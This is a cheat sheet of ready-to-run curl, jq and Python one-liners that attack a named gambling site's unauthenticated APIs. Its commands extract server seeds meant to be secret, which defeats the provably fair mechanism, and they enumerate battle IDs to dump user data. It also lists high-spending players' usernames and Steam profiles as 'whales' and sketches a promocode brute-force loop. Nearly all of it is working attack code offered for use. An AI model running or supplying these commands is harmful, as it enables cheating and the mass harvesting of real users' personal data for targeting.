================================================================================
                    KEY-DROP ONE-LINER EXPLOITS
                  Copy-paste ready attack commands
================================================================================

--------------------------------------------------------------------------------
EXPLOIT 1: GET SERVER SEED (breaks provably fair)
--------------------------------------------------------------------------------

# Get server seed for any battle
curl -s "https://key-drop.app/CaseBattle/gameFullData/51829000" | jq '.data.serverSeed'

# Mass extract seeds (bash loop)
for i in $(seq 51800000 51800100); do
  curl -s "https://key-drop.app/CaseBattle/gameFullData/$i" | jq -r ".data | \"ID: $i | Seed: \(.serverSeed) | Cost: \(.cost)\""
done


--------------------------------------------------------------------------------
EXPLOIT 2: SCRAPE ALL ACTIVE BATTLES
--------------------------------------------------------------------------------

# Get all active high-value battles
curl -s "https://key-drop.app/v2/battle?type=active&limit=100&priceFrom=100" | jq '.data[] | {id, cost, users: [.users[].username]}'


--------------------------------------------------------------------------------
EXPLOIT 3: EXTRACT WHALE DATA
--------------------------------------------------------------------------------

# Find all users betting $500+
curl -s "https://key-drop.app/v2/battle?type=active&limit=500&priceFrom=500" | \
jq '.data[].users[] | select(.isBot == false) | {username, steamId: .idSteam, steamProfile: "https://steamcommunity.com/profiles/\(.idSteam)"}'


--------------------------------------------------------------------------------
EXPLOIT 4: DUMP USER DATABASE
--------------------------------------------------------------------------------

# Python one-liner to dump users
python3 -c "
import requests
users = {}
for i in range(51800000, 51801000):
    r = requests.get(f'https://key-drop.app/CaseBattle/gameFullData/{i}')
    if r.ok and r.json().get('success'):
        for u in r.json()['data'].get('users', []):
            if not u.get('isBot'):
                users[u.get('idSteam')] = u.get('username')
print(f'Found {len(users)} users')
import json; print(json.dumps(users, indent=2))
"


--------------------------------------------------------------------------------
EXPLOIT 5: LIVE BATTLE MONITOR
--------------------------------------------------------------------------------

# Watch for high-value battles in real-time
watch -n 10 'curl -s "https://key-drop.app/v2/battle?type=active&limit=10&sort=price" | jq ".data[] | {id, cost, status, players: (.users | length)}"'


--------------------------------------------------------------------------------
EXPLOIT 6: FIND EXPLOITABLE BATTLES (with leaked seeds)
--------------------------------------------------------------------------------

curl -s "https://key-drop.app/v2/battle?type=active&limit=50" | \
jq '.data[] | select(.status == "new") | .id' | \
while read id; do
  seed=$(curl -s "https://key-drop.app/CaseBattle/gameFullData/$id" | jq -r '.data.serverSeed')
  if [ "$seed" != "null" ]; then
    echo "EXPLOITABLE: Battle $id - Seed: $seed"
  fi
done


--------------------------------------------------------------------------------
EXPLOIT 7: FULL DATA DUMP TO FILE
--------------------------------------------------------------------------------

# Dump 1000 battles to JSON file
python3 -c "
import requests, json
battles = []
for i in range(51800000, 51801000):
    try:
        r = requests.get(f'https://key-drop.app/CaseBattle/gameFullData/{i}', timeout=5)
        if r.ok and r.json().get('success'):
            battles.append(r.json()['data'])
            if len(battles) % 100 == 0: print(f'Dumped {len(battles)}...')
    except: pass
with open('battle_dump.json', 'w') as f:
    json.dump(battles, f)
print(f'Saved {len(battles)} battles')
"


--------------------------------------------------------------------------------
EXPLOIT 8: PROMOCODE BRUTEFORCE (placeholder)
--------------------------------------------------------------------------------

# Test common promocodes
for code in KEYDROP FREE100 BONUS WELCOME VIP CSGO STEAM; do
  echo "Testing: $code"
  # Would need authenticated session to test
done


--------------------------------------------------------------------------------
QUICK FULL EXPLOIT
--------------------------------------------------------------------------------

cd /home/l0ve/pen-test/key-drop.com/exploits && python3 keydrop_exploit.py --quick


================================================================================
                      NOTES
================================================================================

- No authentication required for any of these
- APIs have no rate limiting (be careful not to DoS)
- Server seeds should be SECRET but are exposed
- All user data is publicly accessible
- Over 51 million battles in database

================================================================================
